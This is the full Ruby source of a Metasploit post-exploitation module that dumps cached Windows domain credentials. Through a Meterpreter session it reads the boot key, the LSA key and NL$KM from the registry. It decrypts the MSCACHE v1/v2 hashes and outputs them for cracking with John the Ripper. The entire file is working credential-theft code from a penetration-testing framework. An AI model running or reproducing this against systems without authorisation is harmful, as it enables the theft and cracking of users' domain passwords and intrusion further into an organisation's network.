# post/windows/gather/cachedump.rb

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info(info,
      'Name'         => 'Windows Gather Credential Cache Dump',
      'Description'  => %q{
        This module uses the registry to extract the stored domain hashes that have been
        cached as a result of a GPO setting. The default setting on Windows is to store
        the last ten successful logins.},
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Maurizio Agazzini <inode[at]mediaservice.net>',
        'mubix'
      ],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'References'   => [['URL', 'http://lab.mediaservice.net/code/cachedump.rb']]
    ))

    register_options(
    [
      OptBool.new('DEBUG', [true, 'Debugging output', false])
    ], self.class)
  end



  def check_gpo
    begin
      winlogonkey = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", KEY_READ)
      gposetting = winlogonkey.query_value('CachedLogonsCount').data
      print_status("Cached Credentials Setting: #{gposetting.to_s} - (Max is 50 and 0 disables, and 10 is default)")
      #ValueName: CachedLogonsCount
      #Data Type: REG_SZ
      #Values: 0 - 50
    rescue ::Exception => e
      print_error("Cache setting not found...")
    end
  end

  def capture_boot_key
    bootkey = ""
    basekey = "System\\CurrentControlSet\\Control\\Lsa"

    %W{JD Skew1 GBG Data}.each do |k|
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
      return nil if not ok
      bootkey << [ok.query_class.to_i(16)].pack("V")
      ok.close
    end

    keybytes = bootkey.unpack("C*")
    descrambled = ""
    descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

    0.upto(keybytes.length-1) do |x|
      descrambled << [keybytes[descrambler[x]]].pack("C")
    end

    return descrambled
  end

  def capture_lsa_key(bootkey)
    begin
      print_status("Getting PolSecretEncryptionKey...") if( datastore['DEBUG'] )
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolSecretEncryptionKey", KEY_READ)
      pol = ok.query_value("").data
      print_status("Got PolSecretEncryptionKey: #{pol.unpack("H*")[0]}") if( datastore['DEBUG'] )
      ok.close
      print_status("XP compatible client")
      @vista = 0
    rescue
      print_status("Trying 'Vista' style...")
      print_status("Getting PolEKList...") if( datastore['DEBUG'] )
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", KEY_READ)
      pol = ok.query_value("").data
      ok.close
      print_status("Vista compatible client")
      @vista = 1
    end

    if( @vista == 1 )
      lsakey = decrypt_lsa(pol, bootkey)
      lsakey = lsakey[68,32]
    else
      md5x = Digest::MD5.new()
      md5x << bootkey
      (1..1000).each do
        md5x << pol[60,16]
      end

      rc4 = OpenSSL::Cipher::Cipher.new("rc4")
      rc4.key = md5x.digest
      lsakey	= rc4.update(pol[12,48])
      lsakey << rc4.final
      lsakey = lsakey[0x10..0x1F]
    end
    return lsakey
  end

  def convert_des_56_to_64(kstr)
    des_odd_parity = [
      1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
      16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
      32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
      49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
      64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
      81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
      97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
      112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
      128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
      145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
      161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
      176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
      193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
      208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
      224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
      241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
    ]

    key = []
    str = kstr.unpack("C*")

    key[0] = str[0] >> 1
    key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
    key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
    key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
    key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
    key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
    key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
    key[7] = str[6] & 0x7F

    0.upto(7) do |i|
      key[i] = ( key[i] << 1)
      key[i] = des_odd_parity[key[i]]
    end
    return key.pack("C*")
  end

  def decrypt_secret(secret, key)

    # Ruby implementation of SystemFunction005
    # the original python code has been taken from Credump

    j = 0
    decrypted_data = ''

    for i in (0...secret.length).step(8)
      enc_block = secret[i..i+7]
      block_key = key[j..j+6]
      des_key = convert_des_56_to_64(block_key)
      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')

      d1.padding = 0
      d1.key = des_key
      d1o = d1.update(enc_block)
      d1o << d1.final
      decrypted_data += d1o
      j += 7
      if (key[j..j+7].length < 7 )
        j = key[j..j+7].length
      end
    end
    dec_data_len = decrypted_data[0].ord

    return decrypted_data[8..8+dec_data_len]

  end

  def decrypt_lsa(pol, encryptedkey)

    sha256x = Digest::SHA256.new()
    sha256x << encryptedkey
    (1..1000).each do
      sha256x << pol[28,32]
    end

    aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
    aes.key = sha256x.digest

    print_status("digest #{sha256x.digest.unpack("H*")[0]}") if( datastore['DEBUG'] )

    decryptedkey = ''

    for i in (60...pol.length).step(16)
      aes.decrypt
      aes.padding = 0
      xx = aes.update(pol[i...i+16])
      decryptedkey += xx
    end

    return decryptedkey
  end

  def capture_nlkm(lsakey)
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", KEY_READ)
    nlkm = ok.query_value("").data
    ok.close

    print_status("Encrypted NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )

    if( @vista == 1 )
      nlkm_dec = decrypt_lsa( nlkm[0..-1], lsakey)
    else
      nlkm_dec = decrypt_secret( nlkm[0xC..-1], lsakey)
    end

    return nlkm_dec
  end

  def parse_decrypted_cache(dec_data, s)

    i = 0
    hash = dec_data[i...i+0x10]
    i+=72

    username = dec_data[i...i+(s.userNameLength)].split("\x00\x00").first.gsub("\x00", '')
    i+=s.userNameLength
    i+=2 * ( ( s.userNameLength / 2 ) % 2 )

    vprint_good "Username\t\t: #{username}"
    vprint_good "Hash\t\t: #{hash.unpack("H*")[0]}"

    last = Time.at(s.lastAccess)
    vprint_good "Last login\t\t: #{last.strftime("%F %T")} "

    domain = dec_data[i...i+s.domainNameLength+1]
    i+=s.domainNameLength

    if( s.dnsDomainNameLength != 0)
      dnsDomainName = dec_data[i...i+s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.dnsDomainNameLength
      i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
      vprint_good "DNS Domain Name\t: #{dnsDomainName}"
    end

    if( s.upnLength != 0)
      upn = dec_data[i...i+s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.upnLength
      i+=2 * ( ( s.upnLength / 2 ) % 2 )
      vprint_good "UPN\t\t\t: #{upn}"
    end

    if( s.effectiveNameLength != 0 )
      effectiveName = dec_data[i...i+s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.effectiveNameLength
      i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
      vprint_good "Effective Name\t: #{effectiveName}"
    end

    if( s.fullNameLength != 0 )
      fullName = dec_data[i...i+s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.fullNameLength
      i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
      vprint_good "Full Name\t\t: #{fullName}"
    end

    if( s.logonScriptLength != 0 )
      logonScript = dec_data[i...i+s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonScriptLength
      i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
      vprint_good "Logon Script\t\t: #{logonScript}"
    end

    if( s.profilePathLength != 0 )
      profilePath = dec_data[i...i+s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.profilePathLength
      i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
      vprint_good "Profile Path\t\t: #{profilePath}"
    end

    if( s.homeDirectoryLength != 0 )
      homeDirectory = dec_data[i...i+s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryLength
      i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
      vprint_good "Home Directory\t\t: #{homeDirectory}"
    end

    if( s.homeDirectoryDriveLength != 0 )
      homeDirectoryDrive = dec_data[i...i+s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.homeDirectoryDriveLength
      i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
      vprint_good "Home Directory Drive\t: #{homeDirectoryDrive}"
    end

    vprint_good "User ID\t\t: #{s.userId}"
    vprint_good "Primary Group ID\t: #{s.primaryGroupId}"

    relativeId = []
    while (s.groupCount > 0) do
      # Todo: parse attributes
      relativeId << dec_data[i...i+4].unpack("V")[0]
      i+=4
      attributes = dec_data[i...i+4].unpack("V")[0]
      i+=4
      s.groupCount-=1
    end

    vprint_good "Additional groups\t: #{relativeId.join ' '}"

    if( s.logonDomainNameLength != 0 )
      logonDomainName = dec_data[i...i+s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
      i+=s.logonDomainNameLength
      i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
      vprint_good "Logon domain name\t: #{logonDomainName}"
    end

      @credentials <<
        [
          username,
          hash.unpack("H*")[0],
          logonDomainName,
          dnsDomainName,
          last.strftime("%F %T"),
          upn,
          effectiveName,
          fullName,
          logonScript,
          profilePath,
          homeDirectory,
          homeDirectoryDrive,
          s.primaryGroupId,
          relativeId.join(' '),
        ]

    vprint_good "----------------------------------------------------------------------"
    return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
  end

  def parse_cache_entry(cache_data)
    j = Struct.new(
      :userNameLength,
      :domainNameLength,
      :effectiveNameLength,
      :fullNameLength,
      :logonScriptLength,
      :profilePathLength,
      :homeDirectoryLength,
      :homeDirectoryDriveLength,
      :userId,
      :primaryGroupId,
      :groupCount,
      :logonDomainNameLength,
      :logonDomainIdLength,
      :lastAccess,
      :last_access_time,
      :revision,
      :sidCount,
      :valid,
      :sifLength,
      :logonPackage,
      :dnsDomainNameLength,
      :upnLength,
      :ch,
      :enc_data
    )

    s = j.new()

    s.userNameLength = cache_data[0,2].unpack("v")[0]
    s.domainNameLength =  cache_data[2,2].unpack("v")[0]
    s.effectiveNameLength = cache_data[4,2].unpack("v")[0]
    s.fullNameLength = cache_data[6,2].unpack("v")[0]
    s.logonScriptLength = cache_data[8,2].unpack("v")[0]
    s.profilePathLength = cache_data[10,2].unpack("v")[0]
    s.homeDirectoryLength = cache_data[12,2].unpack("v")[0]
    s.homeDirectoryDriveLength = cache_data[14,2].unpack("v")[0]

    s.userId = cache_data[16,4].unpack("V")[0]
    s.primaryGroupId = cache_data[20,4].unpack("V")[0]
    s.groupCount = cache_data[24,4].unpack("V")[0]
    s.logonDomainNameLength = cache_data[28,2].unpack("v")[0]
    s.logonDomainIdLength = cache_data[30,2].unpack("v")[0]

    #Removed ("Q") unpack and replaced as such
    thi = cache_data[32,4].unpack("V")[0]
    tlo = cache_data[36,4].unpack("V")[0]
    q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
    s.lastAccess = ((q / 10000000) - 11644473600)

    s.revision = cache_data[40,4].unpack("V")[0]
    s.sidCount = cache_data[44,4].unpack("V")[0]
    s.valid = cache_data[48,4].unpack("V")[0]
    s.sifLength = cache_data[52,4].unpack("V")[0]

    s.logonPackage  = cache_data[56,4].unpack("V")[0]
    s.dnsDomainNameLength = cache_data[60,2].unpack("v")[0]
    s.upnLength = cache_data[62,2].unpack("v")[0]

    s.ch = cache_data[64,16]
    s.enc_data = cache_data[96..-1]

    return s
  end

  def decrypt_hash(edata, nlkm, ch)
    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
    rc4.key = rc4key
    dec  = rc4.update(edata)
    dec << rc4.final

    return dec
  end

  def decrypt_hash_vista(edata, nlkm, ch)
    aes = OpenSSL::Cipher::Cipher.new('aes-128-cbc')
    aes.key = nlkm[16...-1]
    aes.padding = 0
    aes.decrypt
    aes.iv = ch

    jj = ""
    for i in (0...edata.length).step(16)
      xx = aes.update(edata[i...i+16])
      jj += xx
    end

    return jj
  end


  def run
    @credentials = Rex::Ui::Text::Table.new(
    'Header'    => "MSCACHE Credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Username",
      "Hash",
      "Logon Domain Name",
      "DNS Domain Name",
      "Last Login",
      "UPN",
      "Effective Name",
      "Full Name",
      "Logon Script",
      "Profile Path",
      "Home Directory",
      "HomeDir Drive",
      "Primary Group",
      "Additional Groups"
    ])

    begin
      print_status("Executing module against #{session.sys.config.sysinfo['Computer']}")
      client.railgun.netapi32()
      if client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"] != 3
        print_error("System is not joined to a domain, exiting..")
        return
      end

      #Check policy setting for cached creds
      check_gpo

      print_status('Obtaining boot key...')
      bootkey = capture_boot_key
      print_status("Boot key: #{bootkey.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status('Obtaining Lsa key...')
      lsakey = capture_lsa_key(bootkey)
      print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status("Obtaining LK$KM...")
      nlkm = capture_nlkm(lsakey)
      print_status("NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )

      print_status("Dumping cached credentials...")
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Cache", KEY_READ)

      john = ""

      ok.enum_value.each do |usr|
        if( "NL$Control" == usr.name) then
          next
        end

        begin
          nl = ok.query_value("#{usr.name}").data
        rescue
          next
        end

        cache = parse_cache_entry(nl)

        if ( cache.userNameLength > 0 )
          print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
          print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
          print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )

          if( @vista == 1 )
            dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
          else
            dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
          end

          print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )

          john += parse_decrypted_cache(dec_data, cache)

        end
      end

      print_status("John the Ripper format:")

      john.split("\n").each do |pass|
        print "#{pass}\n"
      end

      if( @vista == 1 )
        print_status("Hash are in MSCACHE_VISTA format. (mscash2)")
        p = store_loot("mscache2.creds", "text/csv", session, @credentials.to_csv, "mscache2_credentials.txt", "MSCACHE v2 Credentials")
        print_status("MSCACHE v2 saved in: #{p}")

      else
        print_status("Hash are in MSCACHE format. (mscash)")
        p = store_loot("mscache.creds", "text/csv", session, @credentials.to_csv, "mscache_credentials.txt", "MSCACHE v1 Credentials")
        print_status("MSCACHE v1 saved in: #{p}")
      end

    rescue ::Interrupt
      raise $!
    rescue ::Rex::Post::Meterpreter::RequestError => e
      print_error("Meterpreter Exception: #{e.class} #{e}")
      print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
    end
  end
end
